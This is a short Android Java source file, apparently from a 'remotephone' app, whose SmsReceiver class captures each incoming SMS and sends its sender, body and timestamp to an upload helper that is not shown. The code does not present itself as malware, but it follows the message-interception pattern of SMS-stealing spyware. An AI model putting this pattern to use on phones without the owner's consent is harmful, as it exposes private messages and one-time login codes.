package com.exemplo.remotephone;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context ctx, Intent intent) {
        Bundle b = intent.getExtras();
        if (b==null) return;
        Object[] pdus = (Object[]) b.get("pdus");
        if (pdus==null) return;
        for (Object pdu : pdus) {
            SmsMessage msg = SmsMessage.createFromPdu((byte[])pdu);
            UploadHelper.uploadSms(
                ctx,
                msg.getOriginatingAddress(),
                msg.getMessageBody(),
                msg.getTimestampMillis()
            );
        }
    }
}
